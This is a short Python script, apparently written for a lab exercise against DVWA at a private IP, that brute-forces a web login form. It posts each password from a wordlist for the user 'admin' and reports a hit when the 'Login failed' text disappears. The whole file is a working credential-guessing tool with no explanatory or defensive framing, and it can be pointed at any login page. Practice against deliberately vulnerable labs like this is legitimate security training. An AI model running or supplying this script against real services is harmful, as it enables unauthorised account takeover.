import sys
import requests
from termcolor import colored


def proper_response(url, data, verification, word, number, verbose):
    response = requests.post(url, data=data)
    if verbose is not None:
        if verification not in response.content.decode('utf-8'):
            print(colored(f'[+] Working On {number}\t\tPassword Found "{word}"', 'blue'))
            sys.exit(0)
        else:
            print(colored(f'[-] Working On {number}\t\tPassword Invalid "{word}"', 'red'))
    else:
        if verification not in response.content.decode('utf-8'):
            print(colored(f'[+] Password Number {number} in given wordlist\t\tPassword Found "{word}"', 'blue'))
            sys.exit(0)


def brute_force(url, username, username_field, password_field, submit_field_name, verification, word_queue,
                verbose=None):
    number = 1
    words = word_queue.readlines()
    for word in words:
        word = word.strip()
        data = {
            username_field: username,
            password_field: word,
            submit_field_name: 'submit'
        }
        proper_response(url, data, verification, word, number, verbose,)
        number += 1


def main():
    # fix_color_output()
    passwords = open('../../../wordlist/passwords.txt')
    brute_force('http://192.168.56.101/dvwa/login.php', 'admin', 'username', 'password', 'Login',
                'Login failed', passwords, verbose=True)
    # python start.py -l admin -p passwords.txt -u http://192.168.56.101/dvwa/login.php -v "Login failed"


if __name__ == '__main__':
    main()
